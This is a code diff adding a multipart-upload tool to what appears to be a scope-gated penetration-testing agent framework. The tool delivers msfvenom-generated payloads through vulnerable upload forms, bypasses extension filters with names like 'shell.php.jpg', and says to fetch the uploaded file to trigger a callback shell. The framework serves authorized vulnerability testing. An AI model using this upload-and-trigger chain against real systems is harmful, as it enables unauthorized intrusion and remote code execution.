@@ -18,6 +18,13 @@ the stateful counterpart, built on the universal jar + token vault
 - ``session_request`` — arbitrary-method jar-aware request for the odd
   shapes (PUT/DELETE/HEAD, JSON APIs) — cookies applied + persisted, no
   auto-CSRF.
+- ``session_upload`` — multipart file upload (the msfvenom lane's delivery
+  step: file upload vulnerability testing).  Reads a local artifact (e.g.
+  the ``out_path`` from ``payloads/msfvenom_tools.generate_payload``),
+  sends it as ``multipart/form-data`` with jar cookies + auto-CSRF form
+  field, and lets the caller override the multipart filename/content-type
+  (extension-filter bypasses are server-side filename games — the local
+  file never needs renaming).  Every hop gated like the rest of the lane.
 
 The canonical Django flow these enable::
 
@@ -41,6 +48,7 @@ blocking-calls convention.
 
 from __future__ import annotations
 
+import os
 from typing import Any, Dict, List, Optional, Tuple
 from urllib.parse import parse_qsl, urlencode, urlparse
 
@@ -146,6 +154,7 @@ def _do_session_request(
     body_limit: int = 4096,
     extract_tokens: bool = True,
     csrf: bool = False,
+    files: Any = None,
 ) -> Dict[str, Any]:
     """Shared engine: jar-apply -> gated request -> jar-persist -> envelope."""
     jar = get_jar()
@@ -169,6 +178,7 @@ def _do_session_request(
         headers=merged,
         data=data,
         json=json_data,
+        files=files,
         verify=not insecure,
         timeout=(5.0, timeout),
         max_hops=max_hops,
@@ -222,6 +232,19 @@ def _do_session_request(
         "body_length": len(resp.content or b""),
         "body_head": text[: max(0, int(body_limit))],
     }
+    if files:
+        # Multipart part names (dict or tuple-shaped files mapping).
+        try:
+            part_fields = list(files.keys())
+        except AttributeError:
+            part_fields = ["<unnamed>"]
+        envelope["upload"] = {
+            "multipart": True,
+            "file_fields": part_fields,
+            "form_fields": (
+                sorted(str(k) for k in data.keys()) if isinstance(data, dict) else []
+            ),
+        }
     return envelope
 
 
@@ -245,6 +268,12 @@ def _session_digest(result: Dict[str, Any]) -> Dict[str, str]:
         )
     if result.get("title"):
         parts.append(f"title: {result['title']}")
+    if result.get("upload"):
+        up = result["upload"]
+        parts.append(
+            f"uploaded via {', '.join(up.get('file_fields', []))}"
+            + (f" (+form: {', '.join(up['form_fields'])})" if up.get("form_fields") else "")
+        )
     summary = " | ".join(parts)
     hint = (
         "full response incl. body_head is in scratch; filter it with "
@@ -399,4 +428,124 @@ def session_request(
     )
 
 
-__all__ = ["session_get", "session_post", "session_request"]
+UPLOAD_MAX_BYTES = int(os.getenv("SESSION_UPLOAD_MAX_MB", "64")) * 1024 * 1024
+
+
+@framework_tool(
+    "Multipart file upload through a vulnerable upload endpoint — the "
+    "delivery step of the file-upload vulnerability testing lane. Reads a "
+    "local artifact (e.g. the out_path returned by payloads."
+    "msfvenom_tools.generate_payload) and POSTs it as multipart/form-data "
+    "with universal-jar cookies applied AND the stored CSRF token injected "
+    "as a form field — so the upload works through the same authenticated, "
+    "CSRF-guarded session that session_get/session_post walked. The "
+    "multipart FILENAME can be overridden independently of the local file "
+    "(extension-filter bypasses are server-side filename games: pass "
+    "file_name='shell.php.jpg' while the local artifact keeps its real "
+    "name). After a successful upload, session_get the uploaded file's URL "
+    "to trigger the payload; the handler started by "
+    "generate_payload(start_handler=True) catches the callback. Per-hop "
+    "scope-gated like all framework HTTP.",
+    next_hints=[
+        "session_get the uploaded file's URL to trigger the uploaded shell",
+        "generate_payload in payloads/msfvenom_tools.py for the artifact",
+        "report_finding for a confirmed upload vulnerability",
+    ],
+    tags=["exploit.web", "web.auth"],
+    result_digest=_session_digest,
+)
+def session_upload(
+    url: str,
+    file_path: str,
+    file_field: str = "file",
+    file_name: Optional[str] = None,
+    content_type: Optional[str] = None,
+    data: Optional[Dict[str, Any]] = None,
+    auto_csrf: bool = True,
+    insecure: bool = False,
+    timeout: float = 30.0,
+    body_limit: int = 4096,
+    follow_redirects: bool = True,
+    headers: Optional[Dict[str, str]] = None,
+) -> Dict[str, Any]:
+    """POST ``url`` carrying jar state; persist cookies; extract CSRF tokens.
+
+    Args:
+        url: Absolute upload endpoint (the form's action URL). Every
+            redirect hop is scope-gate validated.
+        file_path: Local artifact path — use the out_path returned by
+            generate_payload.
+        file_field: Form field name for the file part (inspect the form's
+            <input type='file' name=...>; 'file' is the common default).
+        file_name: Filename sent in the multipart part (defaults to the
+            local file's basename). Override for extension/filter games —
+            the server sees THIS name, not the local one.
+        content_type: Part Content-Type override (default: sniffed from the
+            filename, octet-stream fallback — most upload validators only
+            check the extension).
+        data: Extra multipart form fields (dict), e.g. the form's hidden
+            inputs; the CSRF form field is appended automatically.
+        auto_csrf: Inject the stored CSRF token as a form field (default
+            true). Turn off for endpoints with no CSRF middleware.
+        insecure: Skip TLS verification.
+        timeout: Per-request read timeout, seconds (uploads of large
+            artifacts take longer than a form post — 30s default).
+        body_limit: Characters of body to return as ``body_head``.
+        follow_redirects: Follow the post-upload 3xx (default) or inspect
+            the raw redirect.
+        headers: Extra request headers (dict).
+    """
+    import hashlib
+    import mimetypes
+    from pathlib import Path
+
+    src = Path(file_path).expanduser()
+    if not src.is_file():
+        # ValueError (not ScopeGateError): local-input problem, not a scope
+        # decision — keep the gate exception unambiguous for the operator.
+        raise ValueError(
+            f"upload source not found: {file_path!r} — generate it with "
+            "payloads/msfvenom_tools.generate_payload (or list_dropbox to see "
+            "existing artifacts)."
+        )
+    size = src.stat().st_size
+    if size > UPLOAD_MAX_BYTES:
+        raise ValueError(
+            f"upload source is {size} bytes (cap {UPLOAD_MAX_BYTES}); raise "
+            "SESSION_UPLOAD_MAX_MB in the root .env if this is deliberate."
+        )
+    blob = src.read_bytes()
+
+    part_name = file_name or src.name
+    ctype = content_type or mimetypes.guess_type(part_name)[0] or "application/octet-stream"
+    files = {file_field: (part_name, blob, ctype)}
+
+    form: Dict[str, Any] = dict(data) if isinstance(data, dict) else (data or {})
+    if not isinstance(form, dict):
+        # Odd shapes (string body) can't merge with multipart parts — the
+        # CSRF field would land as a raw body string and break the encoding.
+        raise ValueError(
+            "session_upload data must be a dict of form fields (multipart); "
+            f"got {type(data).__name__}."
+        )
+
+    envelope = _do_session_request(
+        "POST", url,
+        data=form,
+        insecure=insecure, timeout=timeout, body_limit=body_limit,
+        follow_redirects=follow_redirects, headers=headers,
+        extract_tokens=True, csrf=auto_csrf,
+        files=files,
+    )
+    envelope["uploaded_file"] = {
+        "local_path": str(src),
+        "size_bytes": size,
+        "sha256": hashlib.sha256(blob).hexdigest(),
+        "part_name": part_name,
+        "part_content_type": ctype,
+        "file_field": file_field,
+    }
+    return envelope
+
+
+__all__ = ["session_get", "session_post", "session_request", "session_upload"]
